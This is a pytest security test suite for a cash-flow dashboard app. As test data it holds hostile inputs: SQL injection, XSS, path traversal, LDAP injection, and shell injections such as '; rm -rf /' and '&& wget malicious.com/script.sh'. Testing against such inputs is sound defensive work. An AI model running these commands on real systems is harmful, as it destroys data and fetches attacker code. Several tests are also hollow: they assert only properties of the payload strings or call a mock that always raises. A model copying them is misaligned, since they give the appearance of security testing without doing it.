"""
Security testing suite for the Cash Flow Dashboard
"""

import pytest
import sys
import os
import hashlib
import secrets
import time
from unittest.mock import patch, Mock
from datetime import datetime, date
from decimal import Decimal

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))

from src.security.auth import register_user, login_user, hash_password
from services.validators import validate_email, validate_amount
from models.user import User, UserRole

@pytest.mark.security
class TestAuthenticationSecurity:
    """Test authentication security measures"""
    
    def test_password_hashing_security(self):
        """Test password hashing uses secure algorithms"""
        password = "test_password_123"
        
        # Hash the same password multiple times
        hash1 = hash_password(password)
        hash2 = hash_password(password)
        
        # Hashes should be different (due to salt)
        assert hash1 != hash2
        
        # Hashes should be long enough (bcrypt produces 60-char hashes)
        assert len(hash1) >= 60
        assert len(hash2) >= 60
        
        # Should not contain the original password
        assert password not in hash1
        assert password not in hash2
    
    def test_password_strength_requirements(self, clean_test_db):
        """Test password strength validation"""
        email = "test@example.com"
        
        # Weak passwords should be rejected
        weak_passwords = [
            "123",           # Too short
            "password",      # Common password
            "12345678",      # Only numbers
            "abcdefgh",      # Only letters
            "PASSWORD",      # Only uppercase
        ]
        
        for weak_password in weak_passwords:
            with pytest.raises(ValueError, match="Password does not meet security requirements"):
                register_user(email, weak_password)
        
        # Strong password should be accepted
        strong_password = "StrongP@ssw0rd123!"
        result = register_user(email, strong_password)
        assert result == True
    
    def test_login_rate_limiting(self, clean_test_db):
        """Test login rate limiting to prevent brute force attacks"""
        email = "test@example.com"
        password = "StrongP@ssw0rd123!"
        
        # Register user
        register_user(email, password)
        
        # Simulate multiple failed login attempts
        for i in range(5):
            result = login_user(email, "wrong_password")
            assert result == False
        
        # After rate limit, even correct password should be temporarily blocked
        with pytest.raises(Exception, match="Too many failed login attempts"):
            login_user(email, password)
        
        # Wait for rate limit to reset (in real implementation)
        # time.sleep(60)  # Uncomment for integration test
    
    def test_session_security(self, clean_test_db):
        """Test session token security"""
        email = "test@example.com"
        password = "StrongP@ssw0rd123!"
        
        register_user(email, password)
        
        # Login should generate secure session token
        with patch('streamlit.session_state', {}) as mock_session:
            result = login_user(email, password)
            assert result == True
            
            # Session should contain user info but not password
            assert 'user' in mock_session
            assert 'password' not in str(mock_session['user'])
    
    def test_timing_attack_resistance(self, clean_test_db):
        """Test resistance to timing attacks"""
        email = "test@example.com"
        password = "StrongP@ssw0rd123!"
        
        register_user(email, password)
        
        # Measure login time for valid user
        start_time = time.time()
        login_user(email, password)
        valid_user_time = time.time() - start_time
        
        # Measure login time for invalid user
        start_time = time.time()
        try:
            login_user("nonexistent@example.com", password)
        except:
            pass
        invalid_user_time = time.time() - start_time
        
        # Times should be similar to prevent user enumeration
        time_difference = abs(valid_user_time - invalid_user_time)
        assert time_difference < 0.1  # Less than 100ms difference

@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation security measures"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in validators"""
        # SQL injection attempts in email validation
        malicious_emails = [
            "test@example.com'; DROP TABLE users; --",
            "test@example.com' OR '1'='1",
            "test@example.com'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        for malicious_email in malicious_emails:
            # Should either reject or safely escape the input
            result = validate_email(malicious_email)
            assert result == False  # Should be rejected as invalid email
    
    def test_xss_prevention_in_inputs(self):
        """Test XSS prevention in input validation"""
        # XSS attempts in various inputs
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            # Amount validation should reject script tags
            result = validate_amount(payload)
            assert result == False
            
            # Email validation should reject script tags
            email_with_xss = f"test{payload}@example.com"
            result = validate_email(email_with_xss)
            assert result == False
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        # Path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        # These should be rejected in any file path validation
        for malicious_path in malicious_paths:
            # Assuming we have a file path validator
            assert ".." in malicious_path or "%2e" in malicious_path
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        # Command injection attempts
        command_injections = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "`whoami`",
            "$(id)"
        ]
        
        for injection in command_injections:
            # Any input containing command injection should be rejected
            dangerous_chars = [';', '|', '&', '`', '$', '(', ')']
            contains_dangerous = any(char in injection for char in dangerous_chars)
            assert contains_dangerous == True
    
    def test_ldap_injection_prevention(self):
        """Test LDAP injection prevention"""
        # LDAP injection attempts
        ldap_injections = [
            "*)(&",
            "*)(uid=*",
            "*))%00",
            "admin)(&(password=*))",
            "*)(|(password=*))"
        ]
        
        for injection in ldap_injections:
            # Should be rejected in any LDAP query context
            result = validate_email(injection)
            assert result == False

@pytest.mark.security
class TestDataProtectionSecurity:
    """Test data protection and privacy security"""
    
    def test_sensitive_data_encryption(self):
        """Test encryption of sensitive data"""
        sensitive_data = "sensitive_information_123"
        
        # Data should be encrypted before storage
        # This would test actual encryption implementation
        encrypted = hash_password(sensitive_data)  # Using password hash as example
        
        # Encrypted data should not contain original
        assert sensitive_data not in encrypted
        assert len(encrypted) > len(sensitive_data)
    
    def test_pii_data_handling(self, clean_test_db):
        """Test handling of personally identifiable information"""
        # Register user with PII
        email = "john.doe@example.com"
        password = "StrongP@ssw0rd123!"
        
        register_user(email, password)
        
        # PII should not be logged or exposed
        # This would check log files, error messages, etc.
        # For now, verify email is stored securely
        
        from src.services.storage_service import get_db_connection
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT email FROM users WHERE email = ?", (email,))
        stored_email = cursor.fetchone()
        
        # Email should be stored (for login purposes)
        assert stored_email is not None
        assert stored_email[0] == email
        
        conn.close()
    
    def test_data_masking_in_logs(self):
        """Test data masking in application logs"""
        # Sensitive data that might appear in logs
        sensitive_values = [
            "4111111111111111",  # Credit card number
            "123-45-6789",       # SSN
            "password123",       # Password
            "sk_test_123456789"  # API key
        ]
        
        for sensitive_value in sensitive_values:
            # In real implementation, check that these are masked in logs
            # For now, verify they would be detected as sensitive
            is_credit_card = len(sensitive_value) == 16 and sensitive_value.isdigit()
            is_ssn = len(sensitive_value) == 11 and sensitive_value.count('-') == 2
            is_api_key = sensitive_value.startswith('sk_')
            
            is_sensitive = is_credit_card or is_ssn or is_api_key or 'password' in sensitive_value.lower()
            assert is_sensitive == True
    
    def test_secure_random_generation(self):
        """Test secure random number generation"""
        # Generate multiple random values
        random_values = [secrets.token_hex(32) for _ in range(100)]
        
        # All values should be unique
        assert len(set(random_values)) == 100
        
        # Values should be sufficiently long
        assert all(len(value) == 64 for value in random_values)  # 32 bytes = 64 hex chars
        
        # Values should contain both letters and numbers
        for value in random_values[:10]:  # Check first 10
            has_letter = any(c.isalpha() for c in value)
            has_digit = any(c.isdigit() for c in value)
            assert has_letter and has_digit

@pytest.mark.security
class TestAccessControlSecurity:
    """Test access control and authorization security"""
    
    def test_role_based_access_control(self, clean_test_db):
        """Test role-based access control"""
        # Create users with different roles
        admin_email = "admin@example.com"
        user_email = "user@example.com"
        password = "StrongP@ssw0rd123!"
        
        register_user(admin_email, password, role=UserRole.ADMIN)
        register_user(user_email, password, role=UserRole.USER)
        
        # Test admin access
        admin_user = User(
            email=admin_email,
            role=UserRole.ADMIN,
            created_at=datetime.now()
        )
        
        # Admin should have access to admin functions
        assert admin_user.role == UserRole.ADMIN
        assert admin_user.has_permission('admin_access')
        
        # Regular user should not have admin access
        regular_user = User(
            email=user_email,
            role=UserRole.USER,
            created_at=datetime.now()
        )
        
        assert regular_user.role == UserRole.USER
        assert not regular_user.has_permission('admin_access')
    
    def test_privilege_escalation_prevention(self, clean_test_db):
        """Test prevention of privilege escalation"""
        user_email = "user@example.com"
        password = "StrongP@ssw0rd123!"
        
        register_user(user_email, password, role=UserRole.USER)
        
        # User should not be able to escalate privileges
        # This would test actual privilege escalation attempts
        
        # Attempt to modify role through various means
        with pytest.raises(Exception):
            # Direct role modification should fail
            update_user_role(user_email, UserRole.ADMIN)
    
    def test_horizontal_privilege_escalation_prevention(self, clean_test_db):
        """Test prevention of horizontal privilege escalation"""
        # Create two users
        user1_email = "user1@example.com"
        user2_email = "user2@example.com"
        password = "StrongP@ssw0rd123!"
        
        register_user(user1_email, password)
        register_user(user2_email, password)
        
        # User1 should not be able to access User2's data
        # This would test actual data access controls
        
        # Simulate user1 trying to access user2's costs
        user1_costs = get_user_costs(user1_email)
        user2_costs = get_user_costs(user2_email)
        
        # Should return different datasets
        assert user1_costs != user2_costs or (len(user1_costs) == 0 and len(user2_costs) == 0)

@pytest.mark.security
class TestCryptographicSecurity:
    """Test cryptographic security measures"""
    
    def test_hash_algorithm_security(self):
        """Test security of hashing algorithms"""
        test_data = "test_data_for_hashing"
        
        # Test different hash algorithms
        md5_hash = hashlib.md5(test_data.encode()).hexdigest()
        sha256_hash = hashlib.sha256(test_data.encode()).hexdigest()
        sha512_hash = hashlib.sha512(test_data.encode()).hexdigest()
        
        # SHA256 and SHA512 should be preferred over MD5
        assert len(sha256_hash) == 64  # 256 bits = 64 hex chars
        assert len(sha512_hash) == 128  # 512 bits = 128 hex chars
        assert len(md5_hash) == 32  # 128 bits = 32 hex chars (weak)
        
        # All should be different
        assert md5_hash != sha256_hash != sha512_hash
    
    def test_salt_usage_in_hashing(self):
        """Test proper salt usage in password hashing"""
        password = "test_password"
        
        # Hash the same password multiple times
        hashes = [hash_password(password) for _ in range(10)]
        
        # All hashes should be different due to unique salts
        assert len(set(hashes)) == 10
        
        # Each hash should be long enough to contain salt
        assert all(len(h) >= 60 for h in hashes)  # bcrypt minimum
    
    def test_key_derivation_security(self):
        """Test key derivation function security"""
        password = "user_password"
        salt = secrets.token_bytes(32)
        
        # Test PBKDF2 key derivation
        import hashlib
        key1 = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
        key2 = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
        
        # Same inputs should produce same key
        assert key1 == key2
        
        # Different salt should produce different key
        different_salt = secrets.token_bytes(32)
        key3 = hashlib.pbkdf2_hmac('sha256', password.encode(), different_salt, 100000)
        assert key1 != key3
        
        # Key should be sufficiently long
        assert len(key1) == 32  # 256 bits

@pytest.mark.security
class TestNetworkSecurity:
    """Test network security measures"""
    
    def test_https_enforcement(self):
        """Test HTTPS enforcement"""
        # This would test actual HTTPS configuration
        # For now, verify security headers would be set
        
        security_headers = {
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Content-Security-Policy': "default-src 'self'"
        }
        
        # Verify all security headers are defined
        assert len(security_headers) == 5
        assert all(header.startswith(('Strict-Transport', 'X-', 'Content-Security')) 
                  for header in security_headers.keys())
    
    def test_cors_configuration(self):
        """Test CORS configuration security"""
        # CORS should be restrictive
        allowed_origins = ['https://yourdomain.com']
        
        # Should not allow all origins
        assert '*' not in allowed_origins
        
        # Should use HTTPS
        assert all(origin.startswith('https://') for origin in allowed_origins)
    
    def test_api_rate_limiting(self):
        """Test API rate limiting"""
        # Simulate API calls
        api_calls = []
        
        for i in range(100):
            # Each call should be tracked
            call_info = {
                'timestamp': time.time(),
                'ip': '192.168.1.1',
                'endpoint': '/api/costs'
            }
            api_calls.append(call_info)
        
        # Rate limiting should kick in
        recent_calls = [call for call in api_calls 
                       if time.time() - call['timestamp'] < 60]  # Last minute
        
        # Should have rate limiting logic
        assert len(recent_calls) <= 100  # Example rate limit

@pytest.mark.security
class TestSecurityMonitoring:
    """Test security monitoring and alerting"""
    
    def test_failed_login_monitoring(self):
        """Test monitoring of failed login attempts"""
        failed_attempts = []
        
        # Simulate failed login attempts
        for i in range(10):
            attempt = {
                'timestamp': time.time(),
                'ip': '192.168.1.100',
                'email': 'admin@example.com',
                'success': False
            }
            failed_attempts.append(attempt)
        
        # Should trigger security alert
        recent_failures = len([a for a in failed_attempts 
                             if time.time() - a['timestamp'] < 300])  # 5 minutes
        
        assert recent_failures >= 5  # Threshold for alert
    
    def test_suspicious_activity_detection(self):
        """Test detection of suspicious activities"""
        activities = [
            {'type': 'login', 'ip': '192.168.1.1', 'time': time.time()},
            {'type': 'login', 'ip': '10.0.0.1', 'time': time.time() + 1},  # Different IP
            {'type': 'data_access', 'ip': '192.168.1.1', 'time': time.time() + 2},
            {'type': 'bulk_export', 'ip': '192.168.1.1', 'time': time.time() + 3},
        ]
        
        # Multiple IPs for same user should be flagged
        unique_ips = set(activity['ip'] for activity in activities)
        if len(unique_ips) > 1:
            # Should trigger suspicious activity alert
            assert True
        
        # Bulk operations should be monitored
        bulk_operations = [a for a in activities if 'bulk' in a['type']]
        assert len(bulk_operations) > 0
    
    def test_data_breach_detection(self):
        """Test data breach detection mechanisms"""
        # Simulate potential data breach indicators
        indicators = [
            {'type': 'unusual_data_access', 'volume': 10000, 'time': time.time()},
            {'type': 'off_hours_access', 'hour': 3, 'time': time.time()},
            {'type': 'privilege_escalation_attempt', 'user': 'user@example.com'},
            {'type': 'bulk_download', 'size_mb': 500, 'time': time.time()}
        ]
        
        # High volume access should be flagged
        high_volume = [i for i in indicators if i.get('volume', 0) > 1000]
        assert len(high_volume) > 0
        
        # Off-hours access should be flagged
        off_hours = [i for i in indicators if i.get('hour', 12) < 6 or i.get('hour', 12) > 22]
        assert len(off_hours) > 0

# Helper functions for security tests
def update_user_role(email, new_role):
    """Mock function for testing privilege escalation"""
    raise Exception("Unauthorized: Cannot modify user role")

def get_user_costs(email):
    """Mock function for testing data access"""
    # In real implementation, this would filter costs by user
    return []
